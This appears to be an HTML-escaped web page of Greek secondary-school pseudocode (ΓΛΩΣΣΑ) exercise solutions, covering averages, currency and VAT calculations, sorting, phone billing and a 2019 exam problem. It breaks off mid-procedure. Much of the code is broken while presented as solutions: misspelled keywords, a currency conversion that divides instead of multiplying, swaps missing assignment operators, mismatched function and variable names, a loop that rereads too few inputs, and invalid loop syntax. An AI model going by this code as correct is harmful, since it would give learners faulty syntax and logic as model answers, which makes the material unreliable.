&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>ΣΥΝΑΡΤΗΣΗ ΥΠΟΛΟΓΙΣΕ_Μ_Ο(ΒΑΘΜΟΥΛΗΣ): ΠΡΑΓΜΑΤΙΚΗ
ΜΕΤΑΒΛΗΤΕΣ:
ΑΚΕΡΑΙΕΣ:Ι
ΠΡΑΓΜΑΤΙΚΕΣ:Μ
ΑΡΧΗ
Μ=0
ΓΙΑ Ι ΑΠΌ 1 ΜΕΧΡΙ 10
Μ= Μ + ΒΑΘΜΟΥΛΗΣ[Ι]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΥΠΟΛΟΓΙΣΕ_Μ_Ο = Μ/10
ΤΕΛΟΣ_ΣΥΝΑΡΤΗΣΗΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;pre tabindex="0">&lt;code>
ΣΥΝΑΡΤΗΣΗ ΑΣΚΗΣΗ03(Ποσό_σε_Bitcoin): ΠΡΑΓΜΑΤΙΚΗ
ΣΤΑΘΕΡΕΣ:
ΙΣΟΤΙΜΙΑ = 60000.0
ΜΕΤΑΒΛΗΤΕΣ
ΠΡΑΓΜΑΤΙΚΕΣ:Ποσό_σε_Bitcoin, εκτίμηση
ΑΡΧΗ
ΑΝ (Ποσό_σε_Bitcoin &amp;gt;= 0) ΤΟΤΕ
εκτίμηση = Ποσό_σε_Bitcoin / ΙΣΟΤΙΜΙΑ
ΑΛΛΙΩΣ
!Αν το ποσό είναι αρνητικός αριθμός θα επιστραφεί το 0
εκτίμηση = 0
ΤΕΛΟΣ_ΑΝ
ΑΣΚΗΣΗ03 =εκτίμηση
ΤΕΛΟΣ_ΣΥΝΑΡΤΗΣΗΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚΗΣΗ04
ΜΕΤΑΒΛΗΤΕΣ
ΠΡΑΓΜΑΤΙΚΕΣ: ΜΙΣΘΟΣ[50,200]
ΧΑΡΑΚΤΗΡΕΣ: ΟΝΟΜΑ[50,200]
ΑΡΧΗ
ΚΑΛΕΣΕ ΔΙΑΒΑΣΜΑΤΟΣ(ΟΝΟΜΑ[50,200],ΜΙΣΘΟΣ[50,200])
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
ΔΙΑΔΙΚΑΣΙΑ ΔΙΑΒΑΣΜΑΤΟΣ(ΟΝΟΜΑ[50,200],ΜΙΣΘΟΣ[50,200])
ΜΕΤΑΒΛΗΤΕΣ ΜΙΣΘΟΣ[50,200]
ΠΡΑΓΜΑΤΙΚΕΣ :
ΑΚΕΡΑΙΕΣ: Ι,Υ
ΧΑΡΑΚΤΗΡΕΣ:ΟΝΟΜΑ[50,200]
ΓΙΑ Ι ΑΠΌ 1 ΜΕΧΡΙ 50
ΓΙΑ Υ ΑΠΌ 1 ΜΕΧΙ 200
ΔΙΑΒΑΣΕ ΟΝΟΜΑ[Ι,Υ],ΜΙΣΘΟΣ[Ι,Υ]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΔΙΑΔΙΚΑΣΙΑΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚΗΣΗ05
ΜΕΤΑΒΛΗΤΕΣ
πραγματικεσ:Τιμή, συντ_ΦΠΑ
ΑΡΧΗ
Τιμή =400
συντ_ΦΠΑ =0.10
ΚΑΛΕΣΕ Υπολογισμός_ΦΠΑ (Τιμή, συντ_ΦΠΑ)
τελοσ_προγραμματοσ
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>ΔΙΑΔΙΚΑΣΙΑ
Υπολογισμός_ΦΠΑ (Τιμή, συντ_ΦΠΑ)
ΜΕΤΑΒΛΗΤΕΣ
ΠΡΑΓΜΑΤΙΚΕΣ :
Τιμή, συντ_ΦΠΑ, ποσό_ΦΠΑ, τελ_τιμή
ΑΡΧΗ
Ποσό_ΦΠΑ =τιμή * συντ_ΦΠΑ
τελ_τιμή =Τιμή + Ποσό_ΦΠΑ
ΓΡΑΨΕ&amp;#39;Το ποσό ΦΠΑ είναι, Ποσό_ΦΠΑ
ΓΡΑΨΕ&amp;#39;Η τελική τιμή του προϊόντος είναι&amp;#39;, τελ_τιμή
ΤΕΛΟΣ_ΔΙΑΔΙΚΑΣΙΑΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="η-λύση-της-άσκησης-6-υπάρχει-στο-βίντεο-μου--httpsyoutubey57gxcbipma">Η λύση της άσκησης 6 υπάρχει στο βίντεο μου: &lt;a href="https://youtu.be/y57gXCbIpMA">https://youtu.be/y57gXCbIpMA&lt;/a>&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚΗΣΗ:
ΜΕΤΑΒΛΗΤΕΣ
ΑΚΕΡΑΙΕΣ:
Αριθμός1, Αριθμός2, Αποτέλεσμα
ΑΡΧΗ
ΓΡΑΨΕ
&amp;#39;Εισάγετε 2 ακέραιους θετικούς αριθμούς&amp;#39;
ΔΙΑΒΑΣΕ
Αριθμός1, Αριθμός2
Αποτέλεσμα =0
ΟΣΟ (Αριθμός2 &amp;gt; 0) ΕΠΑΝΑΛΑΒΕ:
ΑΝ (Αριθμός2 MOD2 = 1) ΤΟΤΕ
Αποτέλεσμα =Αποτέλεσμα + Αριθμός1
ΤΕΛΟΣ_ΑΝ
ΚΑΛΕΣΕ Τροποποίηση_Μεταβλητών (Αριθμός1, Αριθμός2)
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΡΑΨΕ &amp;#39;Το αποτέλεσμα είναι: &amp;#39;, Αποτέλεσμα
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
!
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>ΔΙΑΔΙΚΑΣΙΑ
Τροποποίηση_Μεταβλητών (Μ1, Μ2)
ΜΕΤΑΒΛΗΤΕΣ
ΑΚΕΡΑΙΕΣ:Μ1, Μ2
ΠΡΑΓΜΑΤΙΚΕΣ:βοηθητική
ΑΡΧΗ
M1 =M1 * 2
βοηθητική =M2 / 2
M2 =Α_Μ(βοηθητική)
ΤΕΛΟΣ_ΔΙΑΔΙΚΑΣΙΑ
ΣΥΝΑΡΤΗΣΗ Υπολογισμός_ΜΟ (Πλήθος, Πίνακας): ΠΡΑΓΜΑΤΙΚΗ
ΜΕΤΑΒΛΗΤΕΣ
ΠΡΑΓΜΑΤΙΚΕΣ :Πίνακας[1000], άθροισμα
ΑΚΕΡΑΙΕΣ :Πλήθος, i
ΑΡΧΗ
άθροισμα =0
ΓΙΑ i ΑΠΟ 1 ΜΕΧΡΙ Πλήθος
άθροισμα = άθροισμα + Πίνακας[i]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
Υπολογισμός_ΜΟ = άθροισμα / Πλήθος
ΤΕΛΟΣ_ΣΥΝΑΡΤΗΣΗ
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚΗΣΗ07:
ΜΕΤΑΒΛΗΤΕΣ
ΠΡΑΓΜΑΤΙΚΕΣ: ποσΠορτοκάλια, ποσΜπανάνες, ποσΡοδάκινα, ποσΜήλα έσοδα
ΑΡΧΗ
έσοδα &amp;lt;- 0
ΔΙΑΒΑΣΕ ποσΠορτοκάλια, ποσΜπανάνες, ποσΡοδάκινα ,ποσΜήλα
ΟΣΟ ποσΠορτοκάλια &amp;gt;= 0 ΚΑΙ ποσΜπανάνες &amp;gt;= 0 ΚΑΙ ποσΡοδάκινα &amp;gt;= 0 ΚΑΙ ποσΜήλα &amp;gt;= 0 ΕΠΑΝΑΛΑΒΕ
έσοδα &amp;lt;- έσοδα + ΛΟΓΑΡΙΑΣΜΟΣ_ΠΕΛΑΤΗ(ποσΠορτοκάλια, ποσΜπανάνες, ποσΡοδάκινα ,ποσΜήλα)
ΔΙΑΒΑΣΕ ποσΠορτοκάλια, ποσΜπανάνες, ποσΡοδάκινα
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΡΑΨΕ &amp;#34;Συνολικά έσοδα: &amp;#34;, έσοδα, &amp;#34; ευρώ&amp;#34;
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
ΣΥΝΑΡΤΗΣΗ ΛΟΓΑΡΙΑΣΜΟΣ_ΠΕΛΑΤΗ(ποσΠορτοκάλια, ποσΜπανάνες, ποσΡοδάκινα , ποσΜήλα): ΠΡΑΓΜΑΤΙΚΗ
ΜΕΤΑΒΛΗΤΕΣ
ΠΡΑΓΜΑΤΙΚΕΣ: ποσΠορτοκάλια, ποσΜπανάνες, ποσΡοδάκινα ,ποσΜήλα
ΑΡΧΗ
ΛΟΓΑΡΙΑΣΜΟΣ_ΠΕΛΑΤΗ &amp;lt;- ποσΠορτοκάλια * 0.6 + ποσΜπανάνες * 1.7 + ποσΡοδάκινα * 1.1 + ποσΜήλα*1.0
ΤΕΛΟΣ_ΣΥΝΑΡΤΗΣΗΣ
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚΗΣΗ08
ΜΕΤΑΒΛΗΤΕΣ
ΑΚΕΡΑΙΕΣ: i, j
ΠΡΑΓΜΑΤΙΚΕΣ: βολες[3], καλύτερηΒολη[30], tmp1
ΧΑΡΑΚΤΗΡΕΣ: ον[30], ονΚαλύτερου, tmp2
ΑΡΧΗ
ΓΙΑ i ΑΠΟ 1 ΜΕΧΡΙ 30
ΔΙΑΒΑΣΕ ον[i]
ΓΙΑ j ΑΠΟ 1 ΜΕΧΡΙ 3
ΔΙΑΒΑΣΕ βολες[j]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
καλύτερηΒολη[i] &amp;lt;- maxΒολή(βολες)
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ i ΑΠΟ 2 ΜΕΧΡΙ 30
ΓΙΑ j ΑΠΟ 30 ΜΕΧΡΙ i ΜΕ ΒΗΜΑ -1
ΑΝ καλύτερηΒολη[j] &amp;gt; καλύτερηΒολη[j - 1] ΤΟΤΕ
tmp1 &amp;lt;- καλύτερηΒολη[j]
καλύτερηΒολη[j] &amp;lt;- καλύτερηΒολη[j - 1]
καλύτερηΒολη[j - 1] &amp;lt;- tmp1
tmp2 &amp;lt;- ον[j]
ον[j] &amp;lt;- ον[j - 1]
ον[j - 1] &amp;lt;- tmp2
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΡΑΨΕ ον[1], ον[2], ον[3]
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>ΣΥΝΑΡΤΗΣΗ maxΒολή(βολες): ΠΡΑΓΜΑΤΙΚΗ
ΜΕΤΑΒΛΗΤΕΣ
ΑΚΕΡΑΙΕΣ: i
ΠΡΑΓΜΑΤΙΚΕΣ: βολες[3], max
ΑΡΧΗ
max &amp;lt;- βολες[1]
ΓΙΑ i ΑΠΟ 2 ΜΕΧΡΙ 3
ΑΝ βολες[i] &amp;gt; max ΤΟΤΕ
max &amp;lt;- βολες[i]
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
maxΒολή &amp;lt;- max
ΤΕΛΟΣ_ΣΥΝΑΡΤΗΣΗΣ
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚΗΣΗ09
ΜΕΤΑΒΛΗΤΕΣ
ΑΚΕΡΑΙΕΣ : ΧΡΟΝΟΣ_ΟΜΙΛΙΑΣ[10000,12],ΜΒ[10000,12],ΤΡΟΠΟΣ_ΧΡΕΩΣΗΣ[10000]
ΑΚΕΡΑΙΕΣ :Ι,Κ, ΧΡΕΩΣΗ_ΧΡΟΝΟΣ_ΟΜΙΛΙΑΣ[10000,12]
ΠΡΑΓΜΑΤΙΚΕΣ : ΟΛΙΚΗ_ΧΡΕΩΣΗ[10000],ΕΤΗΣΙΑ_ΧΡΕΩΣΗ[10000],ΕΤΗΣΙΑ_ΧΡΕΩΣΗ[10000]
ΠΡΑΓΜΑΤΙΚΕΣ : ΜΕΣΗ_ΜΗΝΙΑΙΑ_ΧΡΕΩΣΗ[10000]
ΧΑΡΑΚΤΗΡΕΣ : ΠΕΛΑΤΗΣ[10000]
ΑΡΧΗ
ΚΑΛΕΣΕ ΕΙΣΑΓΩΓΗ_ΔΕΔΟΜΕΝΩΝ(ΠΕΛΑΤΗΣ,ΧΡΟΝΟΣ_ΟΜΙΛΙΑΣ,ΜΒ,ΤΡΟΠΟΣ_ΧΡΕΩΣΗΣ)
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 10000
ΕΤΗΣΙΑ_ΧΡΕΩΣΗ[Ι] &amp;lt;- 0 ! ΔΗΜΙΟΥΡΓΩ ΠΙΝΑΚΑ ΜΕ ΤΙΣ ΕΤΗΣΙΕΣ ΧΡΕΩΣΕΙΣ
ΜΕΣΗ_ΜΗΝΙΑΙΑ_ΧΡΕΩΣΗ &amp;lt;- 0 ! ΚΑΙ ΠΙΝΑΚΑ ΜΕ ΤΗΝ ΜΕΣΗ ΜΗΝΙΑΙΑ ΧΡΕΩΣΗ ΠΟΥ ΘΑ ΧΡΗΣΙΜΟΠΟΙΗΣΩ ΜΕΤΑ
ΓΙΑ Κ ΑΠΟ 1 ΜΕΧΡΙ 12
! ΕΠΙΣΗΣ ΔΗΜΙΟΥΡΓΩ ΑΛΛΟΝ ΕΝΑ ΠΙΝΑΚΑ ΧΡΕΩΣΗ_ΑΝΑ_ΜΗΝΑ[10000,12]
! ΟΤΙ ΣΕ ΚΑΘΕ ΘΕΣΗ ΥΠΟΛΟΓΙΖΩ ΜΕΣΩ ΤΗΣ ΣΥΝΑΡΤΗΣΗΣ ΤΗΝ ΧΡΕΩΣΗ ΑΝΑ ΜΗΝΑ
ΧΡΕΩΣΗ_ΧΡΟΝΟΣ_ΟΜΙΛΙΑΣ[Ι,Κ] &amp;lt;- ΥΠΟΛΟΓΙΣΜΟΣ_ΧΡΕΩΣΗΣ(ΤΡΟΠΟΣ_ΧΡΕΩΣΗΣ,ΧΡΟΝΟΣ_ΟΜΙΛΙΑΣ)
ΕΤΗΣΙΑ_ΧΡΕΩΣΗ[Ι] &amp;lt;-ΕΤΗΣΙΑ_ΧΡΕΩΣΗ[Ι] + ΧΡΕΩΣΗ_ΧΡΟΝΟΣ_ΟΜΙΛΙΑΣ[Ι,Κ]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΜΕΣΗ_ΜΗΝΙΑΙΑ_ΧΡΕΩΣΗ[Ι] &amp;lt;- ΕΤΗΣΙΑ_ΧΡΕΩΣΗ[Ι] / 12
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΚΑΛΕΣΕ ΕΜΦΑΝΙΣΗ_ΠΑΝΩ_ΑΠΟ_ΟΡΙΟ(ΜΕΣΗ_ΜΗΝΙΑΙΑ_ΧΡΕΩΣΗ,ΠΕΛΑΤΗΣ,150)
ΚΑΛΕΣΕ ΕΜΦΑΝΙΣΗ_ΠΑΝΩ_ΑΠΟ_ΟΡΙΟ(ΕΤΗΣΙΑ_ΧΡΕΩΣΗ,ΠΕΛΑΤΗΣ,2000)
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚΗΣΗ10
ΜΕΤΑΒΛΗΤΕΣ
ΑΚΕΡΑΙΕΣ : Ι,Υ,ΕΤΟΣ_ΓΕΝΝΗΣΗΣ[30,4],ΤΕΜΡ2,ΤΕΜΡ,ΑΡΙΘΜΟΣ_ΠΑΙΔΙΩΝ[30]
ΠΡΑΓΜΑΤΙΚΕΣ :
ΠΡΑΓΜΑΤΙΚΕΣ :
ΧΑΡΑΚΤΗΡΕΣ : ΑΠΑΝΤΗΣΗ,ΕΠΩΝΥΜΑ[30],ΤΕΜΡ1
ΑΡΧΗ
ΓΙΑ Ι ΑΠΌ 1 ΜΕΧΡΙ 30
ΓΙΑ Υ ΑΠΌ 1 ΜΕΧΡΙ 4
ΕΤΟΣ_ΓΕΝΝΗΣΗΣ[Ι,Υ]=0
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ Ι ΑΠΌ 1 ΜΕΧΡΙ 30
ΑΡΙΘΜΟΣ_ΠΑΙΔΙΩΝ[Ι]=0
ΔΙΑΒΑΣΕ ΕΠΩΝΥΜΟ[Ι]
Υ=1
ΔΙΑΒΑΣΕ ΕΤΟΣ_ΓΕΝΝΗΣΗΣ[Ι,Υ]
ΑΡΙΘΜΟΣ_ΠΑΙΔΙΩΝ[Ι]= ΑΡΙΘΜΟΣ_ΠΑΙΔΙΩΝ[Ι] +1
ΓΡΑΨΕ « ΕΧΕΙΣ ΆΛΛΟ ΠΑΙΔΙ;»
ΔΙΑΒΑΣΕ ΑΠΑΝΤΗΣΗ
ΟΣΟ ΑΠΑΝΤΗΣΗ=«ΝΑΙ» ΚΑΙ Υ&amp;lt;=4 ΤΟΤΕ:
ΔΙΑΒΑΣΕ ΕΤΟΣ_ΓΕΝΝΗΣΗΣ[Ι,Υ]
ΑΡΙΘΜΟΣ_ΠΑΙΔΙΩΝ[Ι]= ΑΡΙΘΜΟΣ_ΠΑΙΔΙΩΝ[Ι] +1
ΓΡΑΨΕ « ΕΧΕΙΣ ΆΛΛΟ ΠΑΙΔΙ;»
ΔΙΑΒΑΣΕ ΑΠΑΝΤΗΣΗ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
!ΕΥΡΕΣΗ ΠΟΣΩΝ ΟΙΚΟΓΕΝΕΙΩΝ ΕΣΤΩ ΚΑΙ 1 ΠΑΙΔΙ ΓΕΝΝΗΘΗΚΕ ΤΟ 2009
ΤΙΜΗ2009= ΠΑΙΔΙΑ2009([ΕΤΟΣ_ΓΕΝΝΗΣΗΣ[30,4])
!ΤΑΞΙΝΟΜΗΣΗ ΔΙΣΔΙΑΣΤΑΤΟΥ ΠΙΝΑΚΑ
ΓΙΑ Ι ΑΠΌ 2 ΜΕΧΡΙ 30
ΑΝ ΑΡΙΘΜΟΣ ΠΑΙΔΙΩΝ[Ι]&amp;lt;ΑΡΙΘΜΟΣ_ΠΑΙΔΙΩΝ[Ι-1] ΤΟΤΕ:
TEMP=ΑΡΙΘΜΟΣ_ΠΑΙΔΙΩΝ[Ι]
ΑΡΙΘΜΟΣ_ΠΑΙΔΙΩΝ[Ι] ΑΡΙΘΜΟΣ_ΠΑΙΔΙΩΝ[Ι-1]
ΑΡΙΘΜΟΣ_ΠΑΙΔΙΩΝ[Ι-1]TEMP
TEMP1=ΕΠΩΝΥΜΟ[Ι]
ΕΠΩΝΥΜΟ[Ι]= ΕΠΩΝΥΜΟ[Ι-1]
ΕΠΩΝΥΜΟ[Ι-1]=TEMP1
ΓΙΑ Υ ΑΠΌ 1 ΜΕΧΡΙ 4
TEMP2=ΕΤΟΣ_ΓΕΝΝΗΣΗΣ[Ι,Υ]
ΕΤΟΣ_ΓΕΝΝΗΣΗΣ[Ι,Υ]=ΕΤΟΣ_ΓΕΝΝΗΣΗΣ[Ι-1,Υ]
ΕΤΟΣ_ΓΕΝΝΗΣΗΣ[Ι-1,Υ]=TEMP2
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>ΣΥΝΑΡΤΗΣΗ ΠΑΙΔΙΑ2009(ΕΤΟΣ_ΓΕΝΝΗΣΗΣ[Ι,Υ]:ΑΚΕΡΑΙΑ
ΜΕΤΑΒΛΗΤΕΣ:
ΑΚΕΡΑΙΕΣ: Ι,ΑΡΙΘΜΟΣ
ΛΟΓΙΚΕΣ:FOUND
ΑΡΧΗ
ΑΡΙΘΜΟΣ=0
ΓΙΑ Ι ΑΠΌ 1 ΜΕΧΡΙ 30
Y=1
FOUND=ΨΕΥΔΗΣ
ΟΣΟ Y&amp;lt;=4 ΚΑΙ FOUND = ΨΕΥΔΗΣ
ΑΝ ΕΤΟΣ_ΓΕΝΝΗΣΗΣ[Ι,Υ]=2009 ΤΟΤΕ
ΑΡΙΘΜΟΣ=ΑΡΙΘΜΟΣ +1
!Kάνουμε ΑΛΗΘΗΣ την found για να στάματήσει η επανάληψη χωρίς περιττές επαναλήψεις.Μας
ενδιαφέρει να βρούμε πόσες οικογένειες έχουν παιδί γεννημένο το 2009, όχι πόσα παιδιά εχουν γεννηθεί
το 2009.
FOUND=ΑΛΗΘΗΣ
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΠΑΙΔΙΑ2009=ΑΡΙΘΜΟΣ
TΕΛΟΣ_ΣΥΝΑΡΤΗΣΗΣ
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>ΣΥΝΑΡΤΗΣΗ ΥΠΟΛΟΣΙΜΟΣ_ΧΡΕΩΣΗΣ(ΤΡΟΠΟΣ_ΧΡΕΩΣΗΣ,ΧΡΟΝΟΣ_ΟΜΙΛΙΑΣ):ΠΡΑΓΜΑΤΙΚΗ
ΜΕΤΑΒΛΗΤΕΣ
ΑΚΕΡΑΙΕΣ : Κ,ΧΡΟΝΟΣ_ΟΜΙΛΙΑΣ[10000,12],ΤΡΟΠΟΣ_ΧΡΕΩΣΗΣ[10000]
ΠΡΑΓΜΑΤΙΚΕΣ : ΧΡΕΩΣΗ
ΑΡΧΗ
ΑΝ ΤΡΟΠΟΣ_ΧΡΕΩΣΗΣ = 1 ΤΟΤΕ ! ΤΙΜΟΛΟΓΙΑΚΗ ΠΟΛΙΤΙΚΗ 1
ΑΝ ΧΡΟΝΟΣ_ΟΜΙΛΙΑΣ[Ι,Κ] &amp;lt;= 100 ΤΟΤΕ
ΧΡΕΩΣΗ&amp;lt;- 20 ! ΜΟΝΟ ΠΑΓΙΟ
ΑΛΛΙΩΣ
ΧΡΕΩΣΗ &amp;lt;- (ΧΡΟΝΟΣ_ΟΜΙΛΙΑΣ[Ι,Κ]-100)*0.15
ΤΕΛΟΣ_ΑΝ
ΑΛΛΙΩΣ
ΑΝ ΧΡΟΝΟΣ_ΟΜΙΛΙΑΣ[Ι,Κ] &amp;lt;= 600 ΤΟΤΕ
ΧΡΕΩΣΗ&amp;lt;- 30 ! ΜΟΝΟ ΠΑΓΙΟ
ΑΛΛΙΩΣ
ΧΡΕΩΣΗ&amp;lt;- (ΧΡΟΝΟΣ_ΟΜΙΛΙΑΣ[Ι,Κ]-600)*0.13
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΑΝ
ΥΠΟΛΟΓΙΣΜΟΣ_ΧΡΕΩΣΗΣ &amp;lt;- ΧΡΕΩΣΗ
ΤΕΛΟΣ_ΣΥΝΑΡΤΗΣΗΣ
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>ΔΙΑΔΙΚΑΣΙΑ ΕΙΣΑΓΩΓΗ_ΔΕΔΟΜΕΝΩΝ(Π,ΧΟ,Μ,ΤΧ)
ΜΕΤΑΒΛΗΤΕΣ
ΑΚΕΡΑΙΕΣ : Ι,Κ,Μ [10000,12],ΧΟ[10000,12],ΤΧ[10000]
ΧΑΡΑΚΤΗΡΕΣ : Π[10,000]
ΑΡΧΗ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 10,000
ΔΙΑΒΑΣΕ Π[Ι]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 10,000
ΓΙΑ Κ ΑΠΟ 1 ΜΕΧΡΙ 12
ΔΙΑΒΑΣΕ Μ[Ι,Κ]
ΔΙΑΒΑΣΕ ΧΟ[Ι,Κ]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 10,000
ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣ
ΔΙΑΒΑΣΕ ΤΧ[Ι]
ΜΕΧΡΙΣ_ΟΤΟΥ (ΤΡΟΠΟΣ_ΧΡΕΩΣΗΣ = 1) Ή (ΤΡΟΠΟΣ_ΧΡΕΩΣΗΣ = 2)
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΔΙΑΔΙΚΑΣΙΑΣ
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>ΔΙΑΔΙΚΑΣΙΑ ΕΜΦΑΝΙΣΗ_ΠΑΝΩ_ΑΠΟ_ΟΡΙΟ(ΠΙΝΑΚΑΣ,ΟΝΟΜΑ,ΟΡΙΟ)
ΜΕΤΑΒΛΗΤΕΣ
ΑΚΕΡΑΙΕΣ : Ι
ΠΡΑΓΜΑΤΙΚΕΣ : ΠΙΝΑΚΑΣ[10000]
ΧΑΡΑΚΤΗΡΕΣ : ΟΝΟΜΑ[10000]
ΑΡΧΗ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 10000
ΑΝ ΠΙΝΑΚΑΣ &amp;gt; ΟΡΙΟ ΤΟΤΕ
ΓΡΑΨΕ ΟΝΟΜΑ[Ι] , ΠΙΝΑΚΑΣ[Ι]
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΔΙΑΔΙΚΑΣΙΑΣ
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΠΑΝΕΛΕ2019
ΜΕΤΑΒΛΗΤΕΣ
ΑΚΕΡΑΙΕΣ: ΒΑΘ[40, 6], i, j, κωδ, βαθμ, αρ, ΣΒ[40], temp
ΧΑΡΑΚΤΗΡΕΣ: ΟΝ[40], Απ, temp2
ΑΡΧΗ
ΓΙΑ i ΑΠΟ 1 ΜΕΧΡΙ 40
ΔΙΑΒΑΣΕ ΟΝ[i]
ΓΙΑ j ΑΠΟ 1 ΜΕΧΡΙ 6
ΒΑΘ[i, j] &amp;lt;- 0
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣ
ΔΙΑΒΑΣΕ κωδ, αρ, βαθμ
ΑΝ βαθμ &amp;gt; ΒΑΘ[κωδ, αρ] ΤΟΤΕ
ΒΑΘ[κωδ, αρ] &amp;lt;- βαθμ
ΤΕΛΟΣ_ΑΝ
ΓΡΑΨΕ &amp;#39;Υπάρχει νέα λύση προβλήματος; ΝΑΙ/ΟΧΙ&amp;#39;
ΔΙΑΒΑΣΕ Απ
ΜΕΧΡΙΣ_ΟΤΟΥ Απ = &amp;#39;ΟΧΙ&amp;#39;
ΚΑΛΕΣΕ ΥΣΒ(ΒΑΘ, ΣΒ)
ΓΙΑ i ΑΠΟ 2 ΜΕΧΡΙ 40
ΓΙΑ j ΑΠΟ 40 ΜΕΧΡΙ i ΜΕ_ΒΗΜΑ -1
ΑΝ ΣΒ[j - 1] &amp;lt; ΣΒ[j] ΤΟΤΕ
temp &amp;lt;- ΣΒ[j - 1]
ΣΒ[j - 1] &amp;lt;- ΣΒ[j]
ΣΒ[j] &amp;lt;- temp
temp2 &amp;lt;- ΟΝ[j - 1]
ΟΝ[j - 1] &amp;lt;- ΟΝ[j]
ΟΝ[j] &amp;lt;- temp2
ΑΛΛΙΩΣ_ΑΝ ΣΒ[j - 1] = ΣΒ[j] ΚΑΙ ΟΝ[j - 1] &amp;gt; ΟΝ[j] ΤΟΤΕ
temp2 &amp;lt;- ΟΝ[j - 1]
ΟΝ[j - 1] &amp;lt;- ΟΝ[j]
ΟΝ[j] &amp;lt;- temp2
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ i ΑΠΟ 1 ΜΕΧΡΙ 40
ΓΡΑΨΕ ΟΝ[i]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
ΔΙΑΔΙΚΑΣΙΑ ΥΣΒ(ΒΑΘ, ΣΒ)
ΜΕΤΑΒΛΗΤΕΣ
ΑΚΕΡΑΙΕΣ: ΒΑΘ[40, 6], ΣΒ[40], i, j
ΑΡΧΗ
ΓΙΑ i ΑΠΟ 1 ΜΕΧΡΙ 40
ΣΒ[i] &amp;lt;- 0
